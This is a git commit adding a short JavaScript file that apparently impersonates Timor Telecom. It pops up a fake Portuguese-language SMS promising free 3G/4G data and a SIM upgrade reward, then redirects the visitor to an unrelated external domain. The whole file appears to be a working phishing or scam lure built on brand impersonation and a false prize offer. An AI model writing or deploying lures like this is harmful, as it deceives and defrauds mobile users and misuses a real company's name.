3433df2ecb34e5352ebeac6790e4e2e109547e93
harryjohnson86 <mfonjohnson86@gmail.com>
2025-04-05 14:04:38 -0700

    Create timortelecom-freedata.com.js

---
+++ timortelecom-freedata.com.js
@@ -0,0 +1,5 @@
+var password = 'Presente de dados grátis'
+password=prompt('SMS: Parabéns! Seu número é elegível para receber dados grátis 3G ou 4G UPGRADE SIM CARD REWARD, gentilmente pressione OK para ATIVAR. ','Presente de dados grátis');
+if (password != 'Presente de dados grátis') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
